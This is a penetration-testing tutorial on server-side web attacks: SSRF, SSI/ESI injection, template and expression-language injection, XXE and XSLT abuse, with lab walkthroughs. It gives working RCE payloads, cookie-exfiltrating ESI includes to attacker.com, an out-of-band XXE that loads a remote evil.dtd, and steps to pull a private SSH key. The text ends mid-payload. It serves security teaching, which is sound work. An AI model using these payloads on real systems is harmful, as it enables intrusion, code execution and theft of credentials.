# Server Side Attacks



## Server Side Infrastructure
### Understanding Modern Infrastructure

When interacting with a web application you should be aware that nowadays it is unlikely that just one machine handles your connections.

Modern web application might consist of an application server, a separate database server ( which is secured with a firewall and separated from the outside world ), and performance increase mechanisms like content delivery networks. Often i n such a configuration, the IP correlated with the application’s domain name has nothing to do with the real application servers.

Content delivery networks have the purpose of improving an application’s availability via caching and presenting users with a cached version of a website.

They are used globally for example, when trying to view the website from different parts of the globe, users are connected with the cached version that is present on a server that is geographically closest to them.

Another "performance" part of a web application infrastructure is Load Balancers, for example, F5. Load balancers are used to distribute visitors to several servers hosting a copy of the same web applications to improve reliability.

Load balancers often utilize the "Host" header to redirect users to proper resources (e.g., virtual hosts). Apart from Load Balancers, there are caching proxies that allow caching of some resources in order to render them each time.

Moreover, devices like a Web Application Firewall or an Intrusion Detection Systems might also be incorporated into an application’s infrastructure.

Additionally, proxies and reverse proxies might be in use in order to restrict access to web resources. All these infrastructure elements can be used at once, and all of them reside between the user and the real application server.

![](./assets/1.png)





When an HTTP request is used, it passes through all these layers.

We will refer to those elements as proxies for simplicity, but keep in mind that these are also load balancers, WAFs, Caching services etc.





### Abusing Intermediate Devices

Most of these elements are configured to not only pass through but also interpret a user’s requests. They are used to exclude insecure paths or to disallow users from visiting certain resources (e.g.,/manager related pages on Tomcat based web applications)

In 2018, [interesting research](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf) about handling user requested resources by web servers was released. One of the discovered bugs was the insecure combination of Tomcat and Nginx reverse proxy.



When Tomcat is combined with a nginx reverse proxy, an insecure condition may occur; this is because Tomcat itself will treat ""..;/"" as if it was a parent directory traversal sequence "../" and normalize (sanitize) that sequence.

However, when relying on the reverse proxy for this task, the proxy might not do that, allowing for escaping up one directory because they will pass that path to Tomcat unchanged, and Tomcat will not perform additional validation since it relies on the reverse proxy to do it.

For example, accessing http://tomcatapplication.com/..;/manager/ html on a vulnerable setup might reveal the Tomcat Manager.

Due to the false feeling that it is safe from external users, there is a higher likelihood to spot default credentials on such panels.

Another opportunity to access the hidden Tomcat manager is ajp proxy. AJP proxy typically runs on port 8009 and is accompanied by Tomcat based websites. Historically, it was used by standalone web servers to talk to Tomcat instances for performance reasons. The idea was to leave static content for apache and to do server side processing on Tomcat.

Ajp proxy port is often spotted during penetration testing engagements. It is not a web application port, as ajp13 is a
binary protocol; however, ajp proxy might be a gateway to internal resources, e.g., administrative panels or unpublished websites.

You can configure your own Apache instance to connect to a remote ajp port and then visit http://127.0.0.1 (localhost) to see whether it contains any interesting content.

To connect to a remote ajp port, you need to have Apache installed on your system.

```bash
 apt get install apache2
```



Then, you need to install the ajp related module:
```bash
apt install libapache2-mod-jk
```



And enable it:
```bash
a2enmod proxy_ajp
```



Next, create a file under the path `/etc/apache2/sites-enabled/ajp.conf`

![](./assets/2.png)



Then, restart apache. If everything goes well, you should be able to visit the remote website at http://127.0.0.1 . In case of errors during the apache restart, check your ajp.conf file and make sure it does not contain any additional spaces or tabs.

Since the real web application server is hidden deep inside its infrastructure, the ability to know its real IP address can be a vulnerability itself. It could be even better if one is able to issue a request on behalf of that server or in the most complex case, retrieve the results of such requests.



## Server Side Request Forgery (SSRF)
### SSRF Attack

Server Side request forgery is an attack in which the user is able to make the application server (or a proxy or another part of its infrastructure) issue a request for external resources.

The exploitation of SSRF can lead to:

- Sensitive information disclosure
- Stealing authentication information (e.g., Windows NTLM hashes)
- File read/inclusion
- Remote Code Execution

SSRF’s may occur in different places. The most obvious places to look for them are, for example, in "Load profile picture from URL" functionalities or similar features.

The safest way to fetch a remote file by the target website would be to do it using client side javascript. In such a case, the request is performed by the user’s computer and no application infrastructure takes part in requesting the remote resources.

### When SSRF is a Feature

However, websites might have to choose to fetch the resources remotely with a specialized part of the infrastructure, which is dedicated for such kind of tasks.

An example might be Facebook, which, upon referencing a remote resource in a private message, uses an internal server to fetch that resource and generate a miniature of it.

Once a URL is entered into Facebook’s message window, its server will perform a request to the remote resources. The user agent is named "facebookexternalhit", which suggests that this behavior is intended.

![](./assets/3.png)



Keep in mind that an SSRF attack can be conducted not only against "image import" utilities but any mechanisms that rely on fetching remote resources. In web applications, typically it can be:

- API specification imports (WSDL imports)
- Other file imports
- Connection to remote servers (e.g., FTP)
- "ping" or "alivecheck" utilities
- Any parts of an http request that include URLs



### Blind SSRF Exploitation

SSRF’s can also exist in "blind" form; for example, in document generators. If one is able to inject content into an online PDF generator, inserting something like the code below might likely lead to receiving a GET request from the parser server. It is because the server side content parser will try to evaluate the content before rendering the PDF.

```html
<img src=http://attacker.com:80/ssrf>
```

It will then parse the IMG tag and try to fetch the remote picture without knowing that it does not exist.



If a SSRF is received from a remote parser, it is worth inspecting the full request content (e.g., with a netcat listener) as it may contain interesting headers (including session IDs or technical information)

Another place where SSRF payloads can be inserted is HTTP request headers. You can, for example, place your domain in any HTTP header and look for HTTP or DNS resolution.

Burp intruder might be helpful in that task; for example, you can feed it with a list of [all HTTP headers](https://en.wikipedia.org/wiki/List_of_HTTP_header_fields) and assign your domain to each of them. It is possible that some of the intermediate proxies might try to resolve these domains.

As you now know where to look for the SSRF vulnerabilities, it’s time to show you the potential impact of them. An SSRF vulnerability’s impact relies heavily on the creativity and skills of the penetration tester, as performing an arbitrary request revealing the internal IP is rarely a severe vulnerability itself.



As SSRF is about handling URL’s, let’s recall how the [URL](https://chromium.googlesource.com/chromium/src/+/master/docs/security/url_display_guidelines/url_display_guidelines.md) is built:

![](./assets/4.png)





### SSRF Example

There are a lot of elements to tamper.

We will use the "File Inclusion" module, which is similar to a web application’s fetch file functionalities. DVWA has to run in "Low" security mode.

As DVWA runs on the localhost and we want to proxy our
requests via burp, the following trick is used:

- First, socat is installed ( sudo apt-get install socat )

Then, the DVWA is exposed via port forwarding using socat: external port 800 will be connected to internal 80. Keep in mind that this will expose your vulnerable application instance to the outside world!



Forwarding is achieved using

```bash
sudo socat tcp listen:800,fork tcp:127.0.0.1:80
```

Now, DVWA is available from the outside network; in this case, we have the following IP of the virtual machine that runs dvwa

![](./assets/5.png)

Now we can try to attack the vulnerable application with the help of the Burp Repeater tool. For example, let’s start a local netcat listener and try to fetch its address via a GET request.

![](./assets/6.png)









#### Forcing Authentication

We can see that the back end server interpreter used the username/password combination as a Basic Authentication header! Th is means, when issuing an arbitrary request, we can also do it to like basic authorization protected resources

![](./assets/7.png)

#### Changing Protocol

Moreover, DVWA also accepts an https URL scheme and tries to establish an encrypted connection:

![](./assets/8.png)



Since we are using a plain text connection netcat, we just see the attempt to establish SSL to our listener.

![](./assets/9.png)



The **file://** scheme is also accepted resulting in file inclusion.

![](./assets/10.png)

You can always test more protocol handlers. Sometimes issuing a request will be available only with a few of them. [Supported Protocols and Wrappers](https://www.php.net/manual/en/wrappers.php)



#### Attacking SSRF on Windows

If you suspect the requesting server to be Windows based, you can also try to access a [UNC](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/62e862f4-2a51-452e-8eeb-dc4ff5ee33cc) path in the following format: 

```cmd
\\attackerdomain\sharename
```

If the server tries to authenticate to a fake share, you might be able to steal its NTLM password hash. The hash can be subject to further offline cracking. SMB authentication attempts can be captured, e.g., using the metasploit module **[auxiliary/server/capture/smb](https://www.rapid7.com/db/modules/auxiliary/server/capture/smb/)**



#### Other SSRF Scenarios

Sometimes, it will be possible to fetch a remote HTML file. So, SSRF will lead to Reflected XSS:

![](./assets/11.png)



Upon visiting the URL, the remote HTML file is included by the server.

![](./assets/12.png)





#### Time based SSRF

SSRF can also be used as a time based attack, especially in blind exploitation scenarios.

Based on differences in response time, one may be able to perform an internal port scan or internal network/domain discovery.

For example, for DVWA hosted on our VM, it takes approximately 200 250 milliseconds to fetch http://example.com

![](./assets/13.png)



Asking for a non existent domain causes the page to load immediately. Even if we don’t see the output, we can infer that nothing meaningful can be loaded in such a short time, so such an address is not reachable.

![](./assets/14.png)



#### Extending SSRF

The most powerful SSRF impact is usually when it leads Remote Code Execution. Apart from obvious scenarios that involve file inclusion or reading sensitive data, SSRF sometimes allows the attacker to interact with internal services, which in turn may be vulnerable to other web attacks.

Although in such a scenario an attacker can only use GET requests, this is sometimes sufficient to execute critical actions on internal services and execute arbitrary code.



---

## Server Side Include

You can infer the presence of SSI if the web application you are assessing makes use of .shtml, .shtm or .stm pages, but
it is not the only case

Of course, blind SSI may also exist. The best option to test whether the page is vulnerable is to inject exemplary SSI tags into the web application and observe the place where they are rendered.

You can also add some exemplary SSI payloads to your Burp Intruder list when attacking web application parameters in a generic way (testing for XSSes and similar vulnerabilities)

If you are lucky, you might be able to find evaluated SSI directives in the web page response.

### SSI Expressions

A typical SSI expression has the below format. We will shortly present exemplary directives that can be used for testing and exploitation.

```html
<!--#directive param="value"-->
```



You can try the following code to execute commands for printing server side variables document name and date (echo var), file inclusion (include virtual), and code execution depending on the underlying operating system.

```html
<!--#echo var="DOCUMENT_NAME" -->

<!--#echo var="DATE_LOCAL" -->

<!--#include virtual="/index.html" -->

<!--#exec cmd="dir" -->

<!--#exec cmd="ls" -->
```







### SSI Example

A good place where you can practice these kinds of vulnerabilities is OWASP’s bWAPP pre configured Virtual Machine. (SSI does not work on the self setup release).

![](./assets/15.png)

Submitting the form results in the display of the date by the server.

![](./assets/16.png)





Of course, the other mentioned payloads also work. Below you can see an example for the "ls" command execution.

![](./assets/17.png)





### Edge Side Includes

There’s another similar set or directives called Edge Side Include. Edge Side Include is a set of similar directives but proxies and other similar intermediate infrastructure utilize them.

As previously mentioned, modern web applications often consist of several intermediate servers before users’ requests reach the end application server. We should try to interact with such intermediate infrastructure by injecting some ESI tags to our requests

Edge Side Include (ESI) has a form of xml tags, which are dynamically added to cached static content in order to enrich them with some dynamic features.

The ESI tags are injected by cache mechanisms for other cache mechanisms however, if a user is able to add ESI tags to the HTTP request, the proxies might parse it without knowing its origin.

![](./assets/18.png)





### ESI Expressions

Sample ESI tags might look as follows

```html
<esi:include src="/weather/name?id=$(QUERY_STRING{city_id}) />
```

Since cache is about improving performance, and the only content within the static page might be a menu with some cities URL, there’s no need to treat the page as dynamic. On the other hand, it cannot be full y static due to cities menu; thus, ESI tags are there to solve the issue.



#### ESI Detection

In most cases, ESI injection can only be detected using a blind attack approach. It is possible that you might see the following header in one of the application’s responses:

```http
Surrogate-Control: content="ESI/1.0”
```

In such a case, you can suspect that ESI is in use. However, in most cases, there will be no sign of using ESI or not.



In order to detect ESI injection with a blind approach, the user can try to inject tags that cause the proxies to resolve arbitrary addresses resulting in SSRF.

```html
<esi:include src=http://attacker.com />
```



#### ESI Exploitation
For exploitation scenarios, it might be possible to include a HTML file resulting in XSS

```html
<esi:include src=http://attacker.com/xss.html >
```

And the xss.html can just contain code similar to the following

```html
<script>alert(1)</script>
```



One can also try to exfiltrate cookies directly by referring to a special variable:

```
<esi:include src=http://attacker.com/$(HTTP_COOKIE) >
```

Which can bypass the httpOnly flag in case of its presence.



There is also a possibility that the ESI Injection might lead to Remote Code Execution when it has support for XSLT.

XSLT is a dynamic language used to transform XML files according to a specified pattern.

For the time being, just note the payload for the ESI Injection to the XSLT execution:

```html
<esi:include src="http://attacker.com/file.xml" dca="xslt" stylesheet="http://attacker.com/transformation.xsl"/>
```



You can also see the original research on ESI Injection by GoSecure parts [one](https://gosecure.ai/blog/2018/04/03/beyond-xss-edge-side-include-injection/) and [two](https://gosecure.ai/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)



---

## Language Evaluation

### Language Evaluation Issues

Language evaluation is a generic name we chose for vulnerabilities that include:

- Double evaluation
- Server Side Template Injections
- Expression language injections



All of them are caused by a user’s ability to force the target application server to execute arbitrary programmistic code. That code is however not in plain form, and it is always in the form of an Expression.

These vulnerabilities were grouped together because of the similarity between them in terms of both detection and exploitation. Their root cause might be a bit different though.

#### Template Engines

Some web applications use template systems to enable dynamic content generation into their pages, similar to the previously mentioned server side includes. Consider the following pseudo code:

```php
$template->render("Hello ${user_name}")
```

The expression between `${}` is the Template Expression, which holds the user_name variable. We do not know the origin of user_name ; presumably it’s generated server side e.g., during login. Using the template engine, it is possible to dynamically print that user name on the login page.



Now consider the following vulnerable pseudo code:

```php
$template->render("Hello $_GET['user_name']")
```

In such a case, the user could be able to inject the template expression independently. We now control what will be evaluated and most likely, user_name is the last thing of interest.

Such issues are also called **double evaluation** since the programmistic code is being evaluated twice.

Most popular languages which use templates in web development technologies are

- PHP (Twig, Smarty)
- Python (Flask, Jinja)
- Java (Freemarker)



Such kind of vulnerabilities is not only limited to template engines. In Java applications, some technologies have a similar purpose of generating dynamic content, for example:

- OGNL (Object Graph Navigation Language) - frequently used in Apache Struts RCE exploits
- EL (Expression Language) - generic dynamic expression set for java applications



#### Detecting Template Injection

Server side evaluation of client supplied expressions often leads to critical vulnerabilities, including Remote Code Execution.

This type of vulnerabilities is, however, tricky in both detection and exploitation.

A generic technique for the detection of template / expression language injection is to inject multiple template tags into the web application and observe if they were transformed in some way in the response.

Keep in mind, that often the injected data might be reflected indirectly, for instance, on a different page than it was injected (e.g., invalid login names might be reflected in admin only accessible logs).

You can follow a similar approach when looking for template / expression language injections to the one you use when testing an application for stored XSS vulnerabilities injecting a payload and looking for occurrences of it within the application.

Most template expressions are similar to each other; they are all in curly braces like the below examples but not limited to):

- {{expr}}
- ${expr}
- %{expr}
- #{expr}
- %25{expr}
- {expr}



#### Confirming Template Injection

The best expressions to inject are simple mathematical equations like `${5*11111}` for instance.

In such a case, you would look for the value 55555 in the response of your request. Finding it is a positive sign that server side evaluation possibly occurred. However, further confirmation is required to be sure that the code is executed on the server side and has access to sensitive data.

If you are a user of Burp Suite Pro, you should get an extension named **J2EE Scan** which automatically adds tests for expression language injection. If you are using Burp Community or want to have your customized tool to detect such vulnerabilities, you can build your own list of payloads.

Then, you can look for evaluated numbers (like 55555 or other custom, easily identified values ) in page responses. Another good idea could be to use Burp Intruder to test several payloads of that type, as it is likely that while, for example, `#{5*11111}` will work, `%{5*11111}`  may not.

You can also use the following diagram to help you with profiling this type of vulnerability whether it is a template or expression language injection

![](./assets/19.png)





Further exploitation beyond forcing the application to perform mathematical calculations (which is not really a severe issue) relies heavily on the technology we are dealing with in each case.

Thus, the first step after observing anomalies related to calculations or unusual handling of expressions in curly braces should be trying to identify the underlying technology.

To better identify the technology, you can first:

- Observe which is the generic technology of the application. If it is java (e.g. you see it uses .jsp extensions) then you can suspect it is
  an expression language / OGNL
- Use the diagram as it contain s popular behavior of template engines when handling expressions
- Try to inject unclosed curly braces (be careful as there is a chance you might permanently disable the attacked webpage) this might provoke verbose error disclosing the underlying technology
- Observe other verbose errors for technology names

The last possibility of confirming an injection is to use expressions typical of a certain language. It might often require working with their documentation in order to reference interesting variables or call insecure methods.



#### Exploiting Template Injection

For example, if you are dealing with the PHP template engine called **Smarty**, the RCE payload can be as simple as the one liner below

```php
{php}echo `id`;{/php}
```



The Python engine **Mako** is also very straightforward , as we see below

```python
<%
import os
x=os.popen('id').read()
%>
${x}
```



In the case of the **Twig** PHP engine things are a bit more complex. You can grab your copy of

Injecting `{{5*5}}` into the web form results in "25" being returned to the user.

![](./assets/20.png)





Apart from the aforementioned template injection vulnerability of unknown impact you can also observe an XSS vulnerability if you type in, for example

```html
{{<svg/onload=confirm(1)>}}
```



Trying to brute force object names could be an additional step; for example, Twig utilizes a known object named **{{_self}}** which is a reference to the current application instance)

One of Twig’s `_self` ’s attributes is named env and contains other methods that can be called. You can find the source code on GitHub [here](https://github.com/twigphp/Twig/blob/e22fb8728b395b306a06785a3ae9b12f3fbc0294/lib/Twig/Environment.php)

Let’s find any method that gives an output an d try to execute it. We can infer by the function name that the function "display" might provide some output.

![](./assets/21.png)





Indeed, it simply prints out an output given as an argument. If the function name is modified , there will be no output, so we can assume that the underlying engine is Twig because it executes this Twig specific function

![](./assets/22.png)





Further code analysis leads to line 860 in line **getFilter()**, where it is possible to execute the user defined function:

![](./assets/23.png)

Executing commands via the `getFilter` function must be done as follows:

- Call **registerUndefinedFilterCallback** , which allows us to register any function as a filter callback
- The filter callback is then called by invoking **_self.env**.

By following that way, a payload is constructed:

```php
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}
```

![](./assets/24.png)



Since every template engine has its own functions and methods (and some of them are sandboxed as well), exploiting template injections is dependent on reading the source code and documentation. You can find many object names and methods there.

For learning more about template injection, you can see the original research paper by James Kettle [here](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)





#### Expression Language

When identifying expression language / OGNL injection, the steps are a bit different.

First, Java applications are easily recognizable as they tend to:

- Use common extensions like .jsp or .jsf
- Throw stack traces on errors
- Use known terms in headers like "Servlet"

When confirming the EL/OGNL injection in Java, we must receive the calculation output first like `${5*5}`, which will be evaluated as 25. As a reminder, `${5*5}` is not the only expression of interest but also:

- {5*5}
- ${5*5}
- #{5*5}
- %{5*5}
- %25{5*5}



##### Expression Language Code Execution

Let’s now try to achieve Remote Code Execution. There are two commonly used utilities in Java that allow OS command execution access

```bash
Java.lang.Runtime.getRuntime().exec(command)
AND
java.lang.ProcessBuilder(command, argument1, argument2).start()
```



for example:

```bash
Java.lang.Runtime.getRuntime().exec("id")
OR
{"".getClass().forName("java.lang.Runtime").getRuntime().exec("id")}
```



The result contains a process id, which means that most likely, a new process was spawned. However, obtaining the process output would be much more complicated and would require extending the expression multiple times.

In such a scenario, we would rather go for an interactive reverse shell. In this case we confirm the existence of code execution by issuing curl , as follows:

![](./assets/25.png)



The request is received on a netcat listener.

![](./assets/26.png)



Curl itself is a very powerful tool. Once its accessibility is confirmed, it can be used, e.g., to transfer files to and from the victim machine.

You can easily move a reverse shell and run it using the template injection RCE vulnerability.



##### Extending EL Exploitation

On web application environments, you can also try to enumerate server variables using the Expression Language Injection. Moreover, it might be possible to amend them resulting in, for example, authorization bypasses.

Server variables usually have universal names like `${application}`, `${session}`, `${request}`. Burp Intruder can be utilized for injecting these and looking if interesting data is not returned in result (if the object is resolved).



Below we can see what some sample variable names can look like they are all placed in their respective template curly braces):

- applicationScope - global application variables
- requestScope -  request variables
- initParam - application initialization variables
- sessionScope - session variables
- param.X - parameter value where X is name of a http parameter



Of course retrieving values of these parameters can be possible after casting them to string. So, exemplary extraction of sessionScope might look like the following:
```
${sessionScope.toString()}
```

Sample authorization bypass might be similar to the below statement:

```php
${pageContext.request.getSession().setAttribute("admin", true)}
```



Keep in mind that the application might utilize custom variables. That’s why using the Burp Intruder wordlist is suggested (even the filename list might do). It is possible to find variables named:

- ${user}
- ${password}
- ${employee.firstName}



Similarly to Template Injections, Expression Language injections might also require working with documentation. Often, some characters might be disallowed, or the expression length might be limited. Also, depending on the Expression Language version, some features might be on or off.



Recommended reading

- https://pentest-tools.com/blog/exploiting-ognl-injection-in-apache-struts



---

## Attacking XSLT Engines

### XSLT Purpose

XSLT (eXtensible Stylesheet Language Transformations) is a language used in XML document transformations.

It can also be referred to as XSL; d o not confuse them with excel files *.xls *.xlsx etc.

The XML document can be transformed, or rather formatted using the XSL(T) document. The XSL document also has an xml like structure and defines how another xml file should be transformed.

![](./assets/27.png)

The output of the transformation can be anything, but most often, it is another xml or html-type file. XSL uses its built in functions and XPATH language to select and change parts of an XML document.



#### XSLT Example

We will use [w3schools.com online XSLT parser](https://www.w3schools.com/xml/tryxslt.asp?xmlfile=cdcatalog&xsltfile=cdcatalog_ex1) in order to better explain the transformation process at least its legitimate part!

Here we can see the input XML code:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<catalog>
  <cd>
    <title>Empire Burlesque</title>
    <artist>Bob Dylan</artist>
    <country>USA</country>
    <company>Columbia</company>
    <price>10.90</price>
    <year>1985</year>
  </cd>
</catalog>
```



And the second input is the XSLT code.

```html
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
  <html>
  <body>
    <h2>My CD Collection2</h2>
    <table border="1">
      <tr bgcolor="#9acd32">
        <th>Title</th>
        <th>Artist</th>
      </tr>
      <tr>
        <td>.</td>
        <td>.</td>
      </tr>
    </table>
  </body>
  </html>
</xsl:template>
</xsl:stylesheet>
```



The XSLT document is in XML format and starts with the specific xsl root node "xsl:stylesheet"

```xml
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
</xsl:stylesheet>
```



"xsl:template" match="/" is a directive that means that this stylesheet should apply to any ("/") xml nodes.

```xml
<xsl:template match="/">
</xsl:template>
```



Next, the transformation is defined.

For any XML structure ("/"), the output will look like this code.

```html
  <html>
  <body>
    <h2>My CD Collection2</h2>
    <table border="1">
      <tr bgcolor="#9acd32">
        <th>Title</th>
        <th>Artist</th>
      </tr>
      <tr>
        <td>.</td>
        <td>.</td>
      </tr>
    </table>
  </body>
  </html>
```





You can also see other XSL directives. Those two use XPATH, which is a language used to traverse XML documents and find certain values. In this case, we use the value of (starting from the root node):

```
Catalog
		cd
			title
```



![](./assets/28.png)



In the end, we receive an HTML table that contains values of the node "title". It is purposely doubled. Of course, any

![](./assets/29.png)







##### XSLT Usage

XSL Transformations can often be met in web applications as standalone functionalities. Various software components often offer support for XSL; for example, Oracle Databases in select xmltransform statements or the already mentioned SSI engines



#### Experimenting with XSLT Parser

There are a few well known XSLT engines like Saxon or Xalan in different versions. Of course, there can be custom or experimental ones on the web too.

For the sake of the experiment, we will use Saxon with XSLT 2.0. Currently, XSLT up to 3.0 is available. You may also encounter XSLT 1.0, but it’s the least interesting for a penetration tester due to very few built in functions. Saxon can be downloaded and installed only if you have java installed; thus, on our Ubuntu 16 we issue commands:

```bash
sudo apt-get install default-jdk
sudo apt-get install libsaxonb-java
```

![](./assets/30.png)



We can invoke the transformation by supplying both files as arguments to the parser; this can also be achieved by the web application . However, for simplicity let’s work on a raw parser. The output is the same as the one in the online converter.

![](./assets/31.png)







##### XSLT Engine Detection

Now, let’s use the following code in the XSLT stylesheet named detection.xsl

![](./assets/32.png)





You can see the technical details about the parser have been disclosed.

![](./assets/33.png)







##### XSLT Documentation

Based on the output of detection.xsl, we can check the documentation of the respective XSL versions in order to find interesting functions. For example, you can use the URLs below

- https://www.w3.org/TR/xslt-10/
- https://www.w3.org/TR/xslt20/
- https://www.w3.org/TR/xslt-30/



##### XSLT File Read

Assuming we, as an attacker, control the XSL file, what can we do? For example, let’s take a look at the function "unparsed text"

![](./assets/34.png)



Below you can see an example file using the unparsed text function

![](./assets/35.png)



The result contains a /etc/passwd file.

![](./assets/36.png)



XSL:Include is another interesting function, which allows us to join another xsl stylesheet. The downside is, it has to be a valid XSL document. Upside: SSRF is still possible.

![](./assets/37.png)



##### XSLT SSRF

We use the following XSL document:

![](./assets/38.png)



The netcat listener receives the request. We can recognize the victim java version in the User agent header.

![](./assets/39.png)





##### Extending XSLT Attacks

Of course, in the real world, things might get more difficult. Some functions might be disallowed, but some might be left uncaught, so again working with documentation might help you to identify a severe vulnerability. Also, XSLT parsers may be vulnerable to XXE vulnerabilities in the same way as all other XML parsers.

When responding to XSL:INCLUDE directives, you might also try to respond with XML that contains an XXE payload. Moreover, XSLT engines might be able to execute custom code, which results in RCE!



----

## Labs

### Lab1: SSRF to RCE

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<order>
<product>1234</product>
<count>&xxe;</count>
<contact>User 1</contact>
<account>Admin@123</account>
</order>
```



An XML Validator application is available on port 5000.

Send the following XML snippet for validation:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<parent>
    <child>
        <name>Test Name</name>
        <description>Test Description</description>
    </child>
</parent>
```



 Identify and exploit the XXE vulnerability.

Send the following XML snippet containing an XML entity:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY desc "Test Description"> ]>
<parent>
    <child>
        <name>Test Name</name>
        <description>&desc;</description>
    </child>
</parent>
```

Notice the response contains the description specified in the XML entity!

Not that we know there is an XXE vulnerability; let's leverage it to pull information on the internal services running on the target machine.

Use the following XML snippet to read the contents of the `/proc/net/tcp` file:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY file SYSTEM "file:///proc/net/tcp">
]>
<data>&file;</data>
```

Notice we got back the file contents!

**Contents of the `/proc/net/tcp` file**:

```
sl local_address rem_address st tx_queue rx_queue tr tm->when retrnsmt uid timeout inode
0: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000 0 0 74435656 1 0000000000000000 100 0 0 10 0
1: 0100007F:22B8 00000000:0000 0A 00000000:00000000 00:00000000 00000000 0 0 74418007 1 0000000000000000 100 0 0 10 0
2: 0B00007F:9599 00000000:0000 0A 00000000:00000000 00:00000000 00000000 65534 0 74430920 1 0000000000000000 100 0 0 10 0
3: 00000000:1F40 00000000:0000 0A 00000000:00000000 00:00000000 00000000 0 0 74434697 1 0000000000000000 100 0 0 10 0
4: 034CDCC0:1F40 024CDCC0:EB4C 06 00000000:00000000 03:0000176F 00000000 0 0 0 3 0000000000000000
5: 034CDCC0:1F40 024CDCC0:EB4E 01 00000000:00000000 00:00000000 00000000 0 0 74434828 1 0000000000000000 20 4 30 10 -1
```

**Note:** The information you received would differ slightly since the IP addresses of the machines change at every lab launch. Kindly make sure to fetch the contents of the above file before proceeding.

Decode the IP addresses and port numbers retrieved from the `/proc/net/tcp` file.

Use the following Python script to convert the IP addresses in hex to dotted-decimal notation:

**convert.py:**

```python
import socket
import struct
hex_ip = input("Enter IP (in hex): ")
addr_long = int(hex_ip, 16)
print("IP in dotted-decimal notation:", socket.inet_ntoa(struct.pack("<L", addr_long)))
```





We will send the following XML snippet to the vulnerable web application:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
    <!ENTITY % dtd SYSTEM "http://192.220.76.2:8080/evil.dtd">
    %dtd;
    %all;
]>
<data>&fileContents;</data>
```



Before sending the above XXE payload, save the following snippet as `evil.dtd`:

```xml
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "http://localhost:8888">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
```



Start a Python-based HTTP server on port 8080:

```bash
python3 -m http.server 8080
```



**Information on the payload:**

The first payload (sent to the web app for validation) would load the contents of the `evil.dtd` file from the attacker machine and then this file would be parsed by the backend.

The `evil.dtd` file contains the entity that sends a request to `localhost:8888` and the result is embedded within the CDATA section.

**Information on CDATA:** CDATA sections can be used to "block escape" literal text when replacing prohibited characters with entity references is undesirable.

**Reference:** https://www.w3resource.com/xml/CDATA-sections.php

Some examples of prohibited characters are `<`, `>`, `&`, `"`, `'`.

So, the above payload makes sure that if the response does contain some restricted characters, those characters will get embedded into the CDATA section, and hence the XML validator will raise no errors.



Notice there are 2 entries: **.ssh/** and **flag1**.

Let's fetch these in the subsequent steps.

**Note:** The other internal port open on the machine won't return any information. You are encouraged to interact with it by modifying the `evil.dtd` file to contain the IP and port on which that service is running.

Retrieve the first flag via XXE.

Modify the `evil.dtd` file to fetch the contents of file `flag1`:

```xml
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "http://localhost:8888/flag1">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
```







The output contains the properly-formatted private SSH key.

The above command does the following: - Adds a new line after the `-----BEGIN RSA PRIVATE KEY-----` string - Adds a new line before the `-----END RSA PRIVATE KEY-----` string - For all other string blocks, it adds a new line after every 64 characters

Use the following command to save the formatted private key to the file `fixed_id_rsa`:

```bash
sed -e "s/-----BEGIN RSA PRIVATE KEY-----/&\n/" \
    -e "s/-----END RSA PRIVATE KEY-----/\n&/" \
    -e "s/\S\{64\}/&\n/g" \
    id_rsa > fixed_id_rsa
```







### Lab2: XSLT to Code Execution



An **Online Transformation Service** application is provided. It expects an XML and an XSL file to be uploaded by the user. After both the files are uploaded, the XML file is transformed according to the instructions in the XSL file.

**Information:** XSL (eXtensible Stylesheet Language) is a styling language for XML. XSLT stands for XSL Transformations.

**Reference:** https://www.w3schools.com/xml/xsl_intro.asp

Save a test XML file and an XSL file to detect the backend XSLT engine information.

Save the following content as **test.xml**:

**test.xml:**

```xml
<?xml version="1.0"?>
<root>Hello, World!</root>
```



Save the following content as **test.xsl**:

**test.xsl:**

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:output method="html"/>
    <xsl:template match="/">
    <h2>XSLT Engine Info:</h2>
    <b>Version:</b><xsl:value-of select="system-property('xsl:version')" /><br/>
    <b>Vendor:</b><xsl:value-of select="system-property('xsl:vendor')" /><br/>
    <b>Vendor URL:</b><xsl:value-of select="system-property('xsl:vendor-url')" /><br/>
    </xsl:template>
</xsl:stylesheet>
```

Notice the contents of the XSL file. It contains the **xsl** tags to pull the information about the XSLT engine used by the backend:

- xsl:version
- xsl:vendor
- xsl:vendor-URL



By now, we have understood that the backend is running PHP and using the **libxslt** processor. Also, the processor parses the user-supplied files without any sanitization, as far as we have used it.

Now we will try to execute PHP functions from the XSL file. This will only work if **registerPHPFunctions** is enabled for the XSLT processor, as shown in the following post: https://laurent.bientz.com/Blog/Entry/Item/using_php_functions_in_xsl-7.sls



**test.xsl:**

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"
version="1.0">
<!-- We add the PHP's xmlns -->
    <xsl:template match="/">
        <html>
            <!-- We use the php suffix to call the functions -->
            <xsl:value-of select="php:function('system','uname -a')" />
